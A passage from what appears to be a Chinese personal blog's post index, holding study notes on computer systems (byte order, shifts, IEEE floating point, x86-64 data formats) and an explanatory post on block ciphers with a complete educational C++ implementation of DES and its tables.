要的系统参数就是虚拟地址空间的最大大小。对于一个字长为x位机器，虚拟地址的范围是0~2x-1,程序最多访问2x个字节。 2.寻址和字节顺序小端法：机器在内存中按照从最低有效字节到最高有效字节的顺序存储对象 大端法：机器在内存中按照从最高有效字节到最低有效字节的顺序存储对象 存储变量0x1234567，高位字节的十六进制值为0x01，而低位字节值为0x67 大端法（低位地址存数据高位；高位地址存数据低位）： 小端法（低位地址存数据低位；高位地址存数据高位）： 小端模式低存低 高存高 Windows Linux Android IOS基本都是运行小端模式 3.移位运算左移k位表示丢弃最高的k位，低位补0； 右移有逻辑右移和算术右移：逻辑右移在左端补k个0；算术右移是在左端补k个最高有效位的值，最高为0就全补0，最高为1就全补1 操作 值 参数x 01100011 x&lt;&lt;4 00110000 x&gt;&gt;4(逻辑右移) 00000110 x&gt;&gt;4(逻辑右移) 00000110 操作 值 参数x 10010101 x&gt;&gt;4(算术右移) 11111001 与C语言相比，JAVA对于右移有明确的定义，表达x&gt;&gt;k会将x算术右移k个位置，而x&gt;&gt;&gt;k会对x做逻辑右移 4.浮点数的表示 4.1、IEEE浮点标准：V=(-1)sxMx2E 符号（sign）s决定是负数（s=1）还是正数（s=0），而对于数值0的符号位解释作为特殊情况处理。 尾数（significand）M是一个二进制小数，它的范围是1–2-ε，或者是0–1-ε。 阶码（exponent）E的作用是对浮点数加权，这个权重是2的E次幂（可能是负数）。 在单精度浮点格式（C语言中的float）中，s、exp和frac字段分别为1位、k=8位和n=23位，得到一个32位的表示。在双精度浮点格式（C语言的double）中，s、exp和frac字段分别为1位、k=11位和n=52位，得到一个64位的表示。 4.2、根据exp的值，被编码的值可以分为三种不同的情况，最后一种情况有两个变种 情况1（规格化的值）：exp的位模式（8位或者11位）不全是0也不全是1（对于单精度来说为255，对于双精度是2047），在这种情况，阶码字段被解释为偏置形式表示的有符号整数。也就是说，阶码的值是E=e(读出来的数)-Bias(阶码偏置量)，其中e是无符号数，其位表示为ek-1……e1e0，而Bias是一个等于2k-1-1（单精度是127，双精度是1023）的偏置值。由此产生指数的取值范围，对于单精度是-126—+127，而对于双精度是-1022—+1023。 小数字段frac被解释为描述小数值f，其中0&lt;=f&lt;1，其二进制表示为0.fn-1……f1f0，也就是二进制小数点在最高有效位的左边。尾数定义为M=1+f。有时，这种方式也叫做隐含的以1开头的表示，因为我们可以把M看成一个二进制表达式1.fn-1fn-2……f0的数字。既然我们总是能调整阶码E，使得尾数M在范围1&lt;=M&lt;2之中（假设没有溢出），那么这种表示方法是一种轻松获得一个额外精度位的技巧。既然第一位总是等于1，那么我们就不需要显示地表示它。 假设一个单精度浮点数的位模式为 0|0111 1111|0100 0000 0000 0000 0000 000 首先读出它的符号位为0，为正数，然后由于为一个单精度浮点数，所以他的阶码偏置量为28-1-1=127(0111 1111)这种情况，e由上述读出来为127，阶码E=127-127=0，2E=20=1而有效小数字段从左往右按二进制小数的格式读，通过为小数f=0x2-1+1x2-2+···=1/4，然后该浮点数是规格化的值M=1+f=5/4，最后该浮点数的值 V=(-1)sxMx2E=(-1)0x5/4x20=1.25 情况2（非规格化的值）：当阶码域全为0时，所表示的数是非规格化形式。在这种情况下，阶码值是E=1-Bias，而尾数的值是M=f，也就是小数字段的值，不包含隐含的开头1。 非规格化数有两个用途。首先，它们提供了一种表示数值0的方法，因为使用规格化数，我们必须总是使M&gt;=1，因此我们就不能表示0。实际上，+0.0的浮点表示的位模式为全0：符号位全为0，阶码字段全是0，而小数域也全为0，这就得到M=f=0。令人奇怪的是，当符号位为1，而其他域全为0时，我们得到值-0.0。根据IEEE的浮点格式，值+0.0和-0.0在某些方面被认为是不同的，而在某些方面又是相同的。 情况3：特殊值：当阶码全为1的时候出现的。当小数域全为0时，得到的值表示负无穷，当s=0时是+∞，或者当s=1时是-∞。当我们把两个非常大的数相乘，或者除以0时，无穷能够表示溢出的结果。当小数域为非零时，结果值被称为“NaN”，即“不是一个数（Not a Number）”的缩写。一些运算结果不能是实数或者无穷，就会返回NaN值，比如当计算或时。在某些应用中，表示未初始化的数据时，它们也很有用处。 最大的规格化值的位表示的符号位为0，阶码的最低有效位等于0，其他位等于1。 它的小数值f=1-2-n，尾数M=2-2-n（我们写作2-ε），它的阶码值E=2k-1-1，得到数值。 我们知道12345具有的二进制表示11 0000 0011 1001，通过将二进制小数点左移13位，我们创建这个数的规格化表示，得到12345=1.1000 0001 1100 12*213。为了用IEEE单精度形式来编码，我们丢弃开头的1，并在末尾增加10个0，来构造小数字段，得到二进制表示1000 0001 1100 1000 0000 000(小数位共23位)。为了构造阶码字段，我们用13加上偏置量127，得到140，其二进制表示1000 1100。加上符号位0，我们就得到二进制的浮点表示0|1000 1100|1000 0001 1100 1000 0000 000。我们观察到整数值12345（0x3039）和单精度浮点数值12345.0（0x4640E400）再在位级表示上有下列关系：","categories":[{"name":"深入理解计算机系统","slug":"深入理解计算机系统","permalink":"http://example.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}]},{"title":"密码学-分组密码体制","slug":"密码学/密码学-分组密码体制","date":"2020-11-24T09:29:04.000Z","updated":"2021-04-01T12:41:20.000Z","comments":true,"path":"2020/11/24/密码学/密码学-分组密码体制/","link":"","permalink":"http://example.com/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/","excerpt":"","text":"分组密码概述分组密码是许多系统安全的一个重要组成部分。可用于构造 伪随机数生成器 流密码 消息认证码和杂凑函数 消息认证技术、数据完整性机制、实体认证协议以及单钥数字签字体制 通常n=m。若n&gt;m，则为有数据扩展的分组密码；若n&lt;m，则为有数据压缩的分组密码 安全性设计原则混淆原则混淆原则就是将密文、明文、密钥三者之间的统计关系和代数关系变得尽可能复杂，使得低手即使获得了密文以及明文，也无法求得出密钥的任何信息；即使获得了密文和明文的统计规律，也无法求出明文的新的信息。 明文不能由已知的明文，密文及少许密钥比特代数地或统计地表示出来 密钥不能由已知的明文，密文及少许密钥比特代数地或统计地表示出来 扩散原则扩散原则就是应将明文的统计规律和结构规律散射到相当长的一段统计中去 SP网络替代与置换网络 Festital密码结构分组密码作用在n位明文分组上，而产生n位密文分组。共有2n个不同的明文分组，且由于加密是可逆的(既可以解密)，每一个明文分组将唯一对应一个密文分组。这样的变换称为可逆变换，或非奇异变换。 下图给出了n=4时的一个普通代替密码结构。4位的输入有16种可能的输入状态，每一种被代替密码映射成16种可能输出状态中的唯一 一个，每一个表示4位的密文输出。加密和解密映射可由上图一样用表来定义。这是分组密码的最一般的形式，能用来定义明密文之间的任意可逆变换。 Feistel称这种密码为理想分组密码，因为它允许生成最大数量的加密映射来映射明文分组 从实现和运行的角度来看，采用大规模分组的任意可逆代替密码(即理想分组密码)是不可行的。因为对于这样的变换，映射本身就是一个密钥， 上表定义了n=4时的某个可逆映射，这个映射由表中第二列来定义，给出了每个明文对应的密文，本质它就是决定所有可能映射中某一个映射的密钥。在这种情况下，运用最直接的方法定义密钥，密钥长度为4*16=64位。 DES加密(一个DES例子)对于任意加密方案，总有两个输入：明文和密钥。 DES的明文长64位，密钥长位56位。DES加密一组64位的信息，也就是16个16进制数，同样使用64位长的密码，但是在使用过程中密钥的每第8位被忽略掉，所以使用的有效DES密钥长度为56位。 对于密钥的处理有以下流程： 64位密钥置换成56位 56位密钥分成2个28位的左右序列 序列分别独立做循环左移 左移后进行合并56位（这里的结果要参与下一次的循环左移运算）56位再进行置换成48位即可参与轮函数的运算 由于轮函数有16轮，所以第二步第三步和第四步需要执行16次，输出16个48位的序列。 首先看左边，对于密钥的处理，输入的是64位的密钥，其中8位是奇偶检验位，通过第一次置换选择将64位转为48位，置换表如下 12345678int PC_1[] = &#123;57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4&#125;; 这里补充一下置换表的使用：可以看到该表第1位是57，所以应该取原序列的第57位到变化序列的第1位，以此类推，原序列的第49位到变化序列的第2位····，而且由于此表只有48位，所以变化序列应该也为48位，但是原序列64位，所以有些数据被舍去，这样就达到了缩减位数的目的。 以下是置换函数： 12for(int i=0;i&lt;56;i++) realkeys[55-i]=key[64-PC_1[i]];//置换是从右往左开始 进入一个16次的循环： 123456789101112131415161718192021222324252627for(int time=0;time&lt;16;time++)&#123; //先拿后每28位 然后分别进行左移 //再合成赋值给原来的realkeys //原来的realkey(56)置换成最后的compresskey(48)存入数组 for(int i=0;i&lt;28;i++)&#123; rightkey[i]=realkeys[i]; leftkey[i]=realkeys[i+28]; &#125; rightkey=leftshifts(rightkey,shiftBits[time]); leftkey=leftshifts(leftkey,shiftBits[time]); //左移之后两个key赋值回原来的realkey for(int i=0;i&lt;56;i++)&#123; if(i&lt;28)&#123; realkeys[i]=rightkey[i]; &#125; else&#123; realkeys[i]=leftkey[i-28]; &#125; &#125; //从56-&gt;48存在暂存 for(int i=0;i&lt;48;i++)&#123; compresskeys[47-i]=realkeys[56-PC_2[i]];//置换是从右往左边开始的 &#125; cout&lt;&lt;&quot;48bitreky:&quot;&lt;&lt;realkeys&lt;&lt;endl; subKey[time]=compresskeys; cout&lt;&lt;&quot;--------------------------&quot;&lt;&lt;endl; &#125; 先拿realkey的前后各28位，然后根据左移表的数值进行各自的循环左移，然后再进行合并，再进行一次56-&gt;48位置换缩减，最后填入subKey中，以便接下来轮函数的运算。 下面是左移函数： 12345678910111213bitset&lt;28&gt; leftshifts(bitset&lt;28&gt; key, int position)&#123; bitset&lt;28&gt; temp_key=key; for(int i=27;i&gt;=0;i--)&#123; if(i-position&gt;=0)&#123; key[i]=temp_key[i-position];//假设偏移是1 27就要26 &#125;else &#123; /* 此时的码应该从前面取 循环偏移*/ key[i]=temp_key[i-position+28];//假设偏移是1 -1的位置+28就是最头的位置 &#125; &#125; return key;&#125; 关于明文的处理以及轮函数： 首先对输出的64位明文进行初始置换 置换后将序列分成左右序列 左序列等于有序列,右序列32位与48位密钥进入轮函数 轮函数的输出为32位再与左序列异或 第三步和第四步开始循环16次 最后交换左右序列进行逆初始置换 初始置换： 12 for(int i=0; i&lt;64; ++i)currentBits[63-i] = plain[64-IP[i]]; 分左右序列： 1234for(int i=0;i&lt;32;i++)&#123; rightBits[i]=currentBits[i]; leftBits[i]=currentBits[i+32];&#125; 十六次轮函数： 12345678for(int i=0;i&lt;16;i++)&#123; cout&lt;&lt;&quot;第&quot;&lt;&lt;i+1&lt;&lt;&quot;轮&quot;&lt;&lt;endl; newLeft=rightBits;//保存右序列的值 后续赋给左序列 rightBits=leftBits^f(rightBits,subKey[i]); leftBits=newLeft; cout&lt;&lt;&quot;L&quot;&lt;&lt;i+1&lt;&lt;&quot; &quot;&lt;&lt;leftBits&lt;&lt;endl; cout&lt;&lt;&quot;R&quot;&lt;&lt;i+1&lt;&lt;&quot; &quot;&lt;&lt;rightBits&lt;&lt;endl;&#125; 左右交换合并左右序列，再进行逆初始置换： 1234567891011121314//最后合并密文 左右互换 for(int i=0;i&lt;64;i++)&#123; if(i&lt;32)&#123; cipher[i]=leftBits[i]; &#125;else &#123; cipher[i]=rightBits[i-32]; &#125; &#125; //最后逆初始置换 currentBits=cipher; for(int i=0;i&lt;64;i++)&#123; cipher[63-i]=currentBits[64-IP_1[i]]; &#125; 其中比较重要的是轮函数： 123456789101112131415161718192021222324252627//轮函数bitset&lt;32&gt; f(bitset&lt;32&gt; R, bitset&lt;48&gt;key)&#123; //轮函数里的算法核心是 先将R扩展到48 然后与key进行异或，再进入S盒48代换选择为32bit 最后32进行置换 //扩展置换——异或——代换选择——置换 bitset&lt;48&gt; expend; for(int i=47;i&gt;=0;i--) expend[i]=R[32-E[47-i]]; expend=expend^key; bitset&lt;32&gt; output; //48/6=8 一共8个S盒进行代换选择 顺序应该是从左往右0-5 5-11 11-17 ···· for(int i=0;i&lt;8;i++)&#123; int flag=(i+1)*6-1;//47-flag 就等于每次遍历的后界 假设i=1 flag=5 47-5=42 l：42+5=47 r：42 int row=2*expend[47-flag+5]+expend[47-flag]; int col=8*expend[47-flag+4]+4*expend[47-flag+3]+2*expend[47-flag+2]+expend[47-flag+1]; int outnum=S_BOX[i][row][col]; bitset&lt;4&gt; binary(outnum); for(int j=1;j&lt;=4;j++)//必须从1开始 &#123; output[(8-i)*4-j]=binary[4-j]; &#125; &#125; bitset&lt;32&gt; temp=output; for(int i=0;i&lt;32;i++) output[31-i]=temp[32-P[i]]; return output;&#125; 轮函数输入的是右序列(32)和密钥(48)，首先需要将右序列扩展成48位，同样根据置换表就可以达到效果。 扩展序列expend再与密钥进行一次异或，异或的结果为48位，但最后要输出的序列为32位，所以需要有一个可逆映射，48位通过8个S盒，每6位压缩成4位。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546 S114 4 13 1 2 15 11 8 3 10 6 12 5 9 0 7 0 15 7 4 14 2 13 1 10 6 12 11 9 5 3 8 4 1 14 8 13 6 2 11 15 12 9 7 3 10 5 015 12 8 2 4 9 1 7 5 11 3 14 10 0 6 13 S215 1 8 14 6 11 3 4 9 7 2 13 12 0 5 10 3 13 4 7 15 2 8 14 12 0 1 10 6 9 11 5 0 14 7 11 10 4 13 1 5 8 12 6 9 3 2 1513 8 10 1 3 15 4 2 11 6 7 12 0 5 14 9 S3 10 0 9 14 6 3 15 5 1 13 12 7 11 4 2 813 7 0 9 3 4 6 10 2 8 5 14 12 11 15 113 6 4 9 8 15 3 0 11 1 2 12 5 10 14 7 1 10 13 0 6 9 8 7 4 15 14 3 11 5 2 12 S4 7 13 14 3 0 6 9 10 1 2 8 5 11 12 4 1513 8 11 5 6 15 0 3 4 7 2 12 1 10 14 910 6 9 0 12 11 7 13 15 1 3 14 5 2 8 4 3 15 0 6 10 1 13 8 9 4 5 11 12 7 2 14 S5 2 12 4 1 7 10 11 6 8 5 3 15 13 0 14 914 11 2 12 4 7 13 1 5 0 15 10 3 9 8 6 4 2 1 11 10 13 7 8 15 9 12 5 6 3 0 1411 8 12 7 1 14 2 13 6 15 0 9 10 4 5 3 S612 1 10 15 9 2 6 8 0 13 3 4 14 7 5 1110 15 4 2 7 12 9 5 6 1 13 14 0 11 3 8 9 14 15 5 2 8 12 3 7 0 4 10 1 13 11 6 4 3 2 12 9 5 15 10 11 14 1 7 6 0 8 13 S7 4 11 2 14 15 0 8 13 3 12 9 7 5 10 6 113 0 11 7 4 9 1 10 14 3 5 12 2 15 8 6 1 4 11 13 12 3 7 14 10 15 6 8 0 5 9 2 6 11 13 8 1 4 10 7 9 5 0 15 14 2 3 12 S813 2 8 4 6 15 11 1 10 9 3 14 5 0 12 7 1 15 13 8 10 3 7 4 12 5 6 11 0 14 9 2 7 11 4 1 9 12 14 2 0 6 10 13 15 3 5 8 2 1 14 7 4 10 8 13 15 12 9 0 3 5 6 11 假设序列为011000 010001 011110 111010 100001 100110 010100 100111经过8个S盒 0101 1100 1000 0010 1011 0101 1001 0111举第一个例子，011000，从左往右依次使用1-8S盒子，其中的行由首位和最后一位00看出为第0行，而列由中间四位1100看出为第12列，所以第S1的0行12列为5，刚好对应下面的0101，以上完成第一次代换，通过8次相同的操作即可得到32位。 接下来的32位经过置换即为轮函数的输出 123bitset&lt;32&gt; temp=output; for(int i=0;i&lt;32;i++) output[31-i]=temp[32-P[i]]; 最后轮函数的输出与左序列进行最后的异或即可得到下一轮的右序列。 源代码：DESdemo.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#include&lt;string&gt;#include&lt;iostream&gt;#include&lt;bitset&gt;#include&quot;temp.h&quot;using namespace std;bitset&lt;48&gt; subKey[16]; // 存放16轮子密钥//左移函数bitset&lt;28&gt; leftshifts(bitset&lt;28&gt; key, int position)&#123; bitset&lt;28&gt; temp_key=key; for(int i=27;i&gt;=0;i--)&#123; if(i-position&gt;=0)&#123; key[i]=temp_key[i-position];//假设偏移是1 27就要26 &#125;else &#123; /* 此时的码应该从前面取 循环偏移*/ key[i]=temp_key[i-position+28];//假设偏移是1 -1的位置+28就是最头的位置 &#125; &#125; return key;&#125;//轮函数bitset&lt;32&gt; f(bitset&lt;32&gt; R, bitset&lt;48&gt;key)&#123; //轮函数里的算法核心是 先将R扩展到48 然后与key进行异或，再进入S盒48代换选择为32bit 最后32进行置换 //扩展置换——异或——代换选择——置换 bitset&lt;48&gt; expend; for(int i=47;i&gt;=0;i--) expend[i]=R[32-E[47-i]]; expend=expend^key; bitset&lt;32&gt; output; //48/6=8 一共8个S盒进行代换选择 顺序应该是从左往右0-5 5-11 11-17 ···· for(int i=0;i&lt;8;i++)&#123; int flag=(i+1)*6-1;//47-flag 就等于每次遍历的后界 假设i=1 flag=5 47-5=42 l：42+5=47 r：42 int row=2*expend[47-flag+5]+expend[47-flag]; int col=8*expend[47-flag+4]+4*expend[47-flag+3]+2*expend[47-flag+2]+expend[47-flag+1]; int outnum=S_BOX[i][row][col]; bitset&lt;4&gt; binary(outnum); for(int j=1;j&lt;=4;j++)//必须从1开始 &#123; output[(8-i)*4-j]=binary[4-j]; &#125; &#125; bitset&lt;32&gt; temp=output; for(int i=0;i&lt;32;i++) output[31-i]=temp[32-P[i]]; return output;&#125;int main()&#123; //-------------密钥处理 输入的64位密钥转存在16轮子密钥中----------------------- string keys=&quot;0001001100110100010101110111100110011011101111001101111111110001&quot;; bitset&lt;56&gt; realkeys;//该序列是去掉奇偶标志位而且已经置换过了 bitset&lt;28&gt; leftkey,rightkey; bitset&lt;64&gt; key(keys); bitset&lt;48&gt; compresskeys; cout&lt;&lt;&quot;64bitkeys:&quot;&lt;&lt;key&lt;&lt;endl; //根据密钥置换表，按照里面的置换规则可以去掉奇偶标志位 64-&gt;56 for(int i=0;i&lt;56;i++) realkeys[55-i]=key[64-PC_1[i]];//置换是从右往左开始 cout&lt;&lt;&quot;56bitreky:&quot;&lt;&lt;realkeys&lt;&lt;endl; //先移位再置换 56-&gt;48 并且存于subkey里面 for(int time=0;time&lt;16;time++)&#123; //先拿后每28位 然后分别进行左移 //再合成赋值给原来的realkeys //原来的realkey(56)置换成最后的compresskey(48)存入数组 for(int i=0;i&lt;28;i++)&#123; rightkey[i]=realkeys[i]; leftkey[i]=realkeys[i+28]; &#125; rightkey=leftshifts(rightkey,shiftBits[time]); leftkey=leftshifts(leftkey,shiftBits[time]); cout&lt;&lt;&quot;第&quot;&lt;&lt;time+1&lt;&lt;&quot;次:&quot;&lt;&lt;endl; cout&lt;&lt;&quot;lfky:&quot;&lt;&lt;leftkey&lt;&lt;endl; cout&lt;&lt;&quot;rgky:&quot;&lt;&lt;rightkey&lt;&lt;endl; //左移之后两个key赋值回原来的realkey for(int i=0;i&lt;56;i++)&#123; if(i&lt;28)&#123; realkeys[i]=rightkey[i]; &#125; else&#123; realkeys[i]=leftkey[i-28]; &#125; &#125; //从56-&gt;48存在暂存 for(int i=0;i&lt;48;i++)&#123; compresskeys[47-i]=realkeys[56-PC_2[i]];//置换是从右往左边开始的 &#125; cout&lt;&lt;&quot;48bitreky:&quot;&lt;&lt;realkeys&lt;&lt;endl; subKey[time]=compresskeys; cout&lt;&lt;&quot;--------------------------&quot;&lt;&lt;endl; &#125;//-------------密钥处理 输入的64位密钥转存在16轮子密钥中----------------------- //-----------------加密过程----------------- string mingwen=&quot;000100100011010001010110011110001001101010111100110111101111&quot;; bitset&lt;64&gt; plain(mingwen);//bitset的偏移是从右往左进行偏移 cout&lt;&lt;&quot;明文:&quot;&lt;&lt;plain&lt;&lt;endl; //置换后的原文 bitset&lt;64&gt; currentBits; //左右各32位 bitset&lt;32&gt; leftBits,rightBits; bitset&lt;32&gt; newLeft; //加密后的密文 bitset&lt;64&gt; cipher; //首先对密文进行初始置换 for(int i=0; i&lt;64; ++i) currentBits[63-i] = plain[64-IP[i]]; cout&lt;&lt;&quot;初始置换:&quot;&lt;&lt;currentBits&lt;&lt;endl; for(int i=0;i&lt;32;i++)&#123; rightBits[i]=currentBits[i]; leftBits[i]=currentBits[i+32]; &#125; cout&lt;&lt;&quot;L0 &quot;&lt;&lt;leftBits&lt;&lt;endl; cout&lt;&lt;&quot;R0 &quot;&lt;&lt;rightBits&lt;&lt;endl; //十六轮迭代 for(int i=0;i&lt;16;i++)&#123; cout&lt;&lt;&quot;第&quot;&lt;&lt;i+1&lt;&lt;&quot;轮&quot;&lt;&lt;endl; newLeft=rightBits; rightBits=leftBits^f(rightBits,subKey[i]); leftBits=newLeft; cout&lt;&lt;&quot;L&quot;&lt;&lt;i+1&lt;&lt;&quot; &quot;&lt;&lt;leftBits&lt;&lt;endl; cout&lt;&lt;&quot;R&quot;&lt;&lt;i+1&lt;&lt;&quot; &quot;&lt;&lt;rightBits&lt;&lt;endl; &#125; cout&lt;&lt;&quot;L16&quot;&lt;&lt;&quot; &quot;&lt;&lt;leftBits&lt;&lt;endl; cout&lt;&lt;&quot;R16&quot;&lt;&lt;&quot; &quot;&lt;&lt;rightBits&lt;&lt;endl; //最后合并密文 左右互换 for(int i=0;i&lt;64;i++)&#123; if(i&lt;32)&#123; cipher[i]=leftBits[i]; &#125;else &#123; cipher[i]=rightBits[i-32]; &#125; &#125; //最后逆初始置换 currentBits=cipher; for(int i=0;i&lt;64;i++)&#123; cipher[63-i]=currentBits[64-IP_1[i]]; &#125; cout&lt;&lt;&quot;密文:&quot;&lt;&lt;cipher&lt;&lt;endl; system(&quot;pause&quot;);&#125; temp.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119// 初始置换表int IP[] = &#123;58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7&#125;;// 结尾置换表int IP_1[] = &#123;40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25&#125;;/*------------------下面是生成密钥所用表-----------------*/// 密钥置换表，将64位密钥变成56位int PC_1[] = &#123;57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4&#125;; // 压缩置换，将56位密钥压缩成48位子密钥int PC_2[] = &#123;14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32&#125;;// 每轮左移的位数int shiftBits[] = &#123;1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1&#125;;/*------------------下面是密码函数 f 所用表-----------------*/// 扩展置换表，将 32位 扩展至 48位int E[] = &#123;32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25, 24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1&#125;;// S盒，每个S盒是4x16的置换表，6位 -&gt; 4位int S_BOX[8][4][16] = &#123; &#123; &#123;14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7&#125;, &#123;0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8&#125;, &#123;4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0&#125;, &#123;15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13&#125; &#125;, &#123; &#123;15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10&#125;, &#123;3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5&#125;, &#123;0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15&#125;, &#123;13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9&#125; &#125;, &#123; &#123;10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8&#125;, &#123;13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1&#125;, &#123;13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7&#125;, &#123;1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12&#125; &#125;, &#123; &#123;7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15&#125;, &#123;13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9&#125;, &#123;10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4&#125;, &#123;3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14&#125; &#125;, &#123; &#123;2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9&#125;, &#123;14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6&#125;, &#123;4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14&#125;, &#123;11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3&#125; &#125;, &#123; &#123;12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11&#125;, &#123;10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8&#125;, &#123;9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6&#125;, &#123;4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13&#125; &#125;, &#123; &#123;4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1&#125;, &#123;13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6&#125;, &#123;1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2&#125;, &#123;6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12&#125; &#125;, &#123; &#123;13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7&#125;, &#123;1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2&#125;, &#123;7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8&#125;, &#123;2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11&#125; &#125; &#125;;// P置换，32位 -&gt; 32位 轮函数的最后置换int P[] = &#123;16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25 &#125;;","categories":[{"name":"密码学","slug":"密码学","permalink":"http://example.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[]},{"title":"深入理解计算机系统-程序的机器级表示","slug":"计算机系统/深入理解计算机系统-程序的机器级表示","date":"2020-11-19T06:48:39.000Z","updated":"2021-04-01T14:11:20.000Z","comments":true,"path":"2020/11/19/计算机系统/深入理解计算机系统-程序的机器级表示/","link":"","permalink":"http://example.com/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/","excerpt":"","text":"1.程序编码1.gcc -0g -o p p1.c p2.c 编译选项-Og告诉表一起使用生成符合原始C代码的整体结构的机器代码的优先优化等级，使用较高优化产生的代码会严重变形，以至于产生的机器代码和初始源代码之间的关系非常难以理解。实际使用中，从得到的程序性能考虑，较高级别的的优化-O1，-O2被认为是较好的选择。编译器产生两个源文件的汇编代码，名字分别叫做p1.s和p2.s。接下来编译器会将汇编代码转化成二进制的目标文件p1.o和p2.o。目标代码是机器代码的一种形式，它包含的所有指令的二进制表示，但是还没完全填入全局区值得的地址。最后，连接器将两个目标代码文件与实现库函数的代码合并，并产生最终的可执行文件，上面又命令行-o p实现。 gcc -Og -S xxx.c 会产生一个xxx.s的汇编文件 gcc -Og -c xxx.c 会产生一个xxx.o的二进制代码文件 2.数据格式在X86-64，标准int值存储为双字4字节共32位，指针存储为四字八字节共64位，数据类型long实现为64位，表示的范围也较大。 C声明 Intel数据类型 汇编代码后缀 大小（字节） char 字节 b（byte） 1 short 字 w（word） 2 int 双字 l（long word） 4 long 四字 q（quad words） 8 char *（指针） 四字 q（quad words） 8 float 单精度 s 4 double 双精度 l 8 3.访问信息一个64位机器包含一个存储64位置的通用目的寄存器，这些寄存器用来存储整数数据和指针。32扩展到64位机器主要多了%r8-%r15八个新的寄存器。 在通用寄存器中%rdi、%rsi、%rdx、%rcx、%8、%9分别是调用函数1-6个参数的值，然后多余参数压入栈中。 